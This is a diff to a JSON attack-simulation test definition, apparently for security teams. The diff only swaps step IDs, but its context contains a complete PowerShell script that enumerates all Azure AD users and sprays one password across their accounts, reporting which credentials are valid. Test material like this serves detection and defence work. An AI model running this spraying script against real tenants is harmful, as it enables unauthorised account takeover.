@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "33da3fac-823b-4986-9595-48abc05900b3",
+      "id": "dfade3ca-6740-41d6-8104-d3850941a4d3",
       "type": "execute-command",
       "data": {
         "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n($Users = Get-AzureADUser -All $true) \u003e $null\nDisconnect-AzureAD \u003e $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2\u003e\u00261\u003e $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD \u003e $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "1d45171a-9052-4f09-9d6b-b42983f0e660",
+      "id": "26d3e6bc-2f2f-470e-b9e6-cf9958b05a7e",
       "name": "Check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "f49def85-58c2-4e57-b00d-f7ff2fad1298",
+      "id": "cebb338f-4c45-496e-b679-d5f13dce411d",
       "name": "Resolve dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "d82c2ef4-f226-4660-96cc-eeb0fb2cc1e3",
+      "id": "71fbdc3e-2bc6-47e8-b486-be19fae1591a",
       "name": "Re-check dependency 1/1",
       "description": "AzureAD module must be installed.\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "1d45171a-9052-4f09-9d6b-b42983f0e660",
+      "s": "26d3e6bc-2f2f-470e-b9e6-cf9958b05a7e",
       "p": "on-success",
-      "o": "33da3fac-823b-4986-9595-48abc05900b3"
+      "o": "dfade3ca-6740-41d6-8104-d3850941a4d3"
     },
     {
-      "s": "1d45171a-9052-4f09-9d6b-b42983f0e660",
+      "s": "26d3e6bc-2f2f-470e-b9e6-cf9958b05a7e",
       "p": "on-failure",
-      "o": "f49def85-58c2-4e57-b00d-f7ff2fad1298"
+      "o": "cebb338f-4c45-496e-b679-d5f13dce411d"
     },
     {
-      "s": "f49def85-58c2-4e57-b00d-f7ff2fad1298",
+      "s": "cebb338f-4c45-496e-b679-d5f13dce411d",
       "p": "on-success",
-      "o": "d82c2ef4-f226-4660-96cc-eeb0fb2cc1e3"
+      "o": "71fbdc3e-2bc6-47e8-b486-be19fae1591a"
     },
     {
-      "s": "d82c2ef4-f226-4660-96cc-eeb0fb2cc1e3",
+      "s": "71fbdc3e-2bc6-47e8-b486-be19fae1591a",
       "p": "on-failure",
-      "o": "33da3fac-823b-4986-9595-48abc05900b3"
+      "o": "dfade3ca-6740-41d6-8104-d3850941a4d3"
     }
   ],
   "tags": [
